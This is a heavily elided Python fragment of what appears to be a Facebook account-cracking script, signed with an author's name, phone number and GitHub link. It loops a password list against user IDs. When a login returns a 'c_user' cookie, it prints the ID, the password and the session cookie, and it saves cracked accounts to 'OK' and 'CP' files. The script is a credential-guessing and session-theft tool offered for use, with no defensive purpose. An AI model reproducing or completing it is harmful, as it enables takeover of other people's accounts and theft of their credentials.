#----------------------------------------------------------------------------------------------------------
#CREATE BY : Hridoy Chowdhury Raihan 
#WHATSAPP : +8801787720693
#GITHUB : https://github.com/RAIHAN-404
#----------------------------------------------------------------------------------------------------------
...
def fuck():
    ...
    print(' [+] OK Ids saved in RAIHAN/OK.txt')
    print(' [+] CP Ids saved in RAIHAN/CP.txt')
    print('==================================================')
def mumit2(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r\033[1;92m[RAIHAN]--[%s/%s]--[OK-%s]~[CP-%s] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[1;92m[RAIHAN-OK] {uid}|{ps} \nCookie : {coki}")
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                #print(f"\033[1;94m[RAIHAN-CP] {cid}|{ps}")
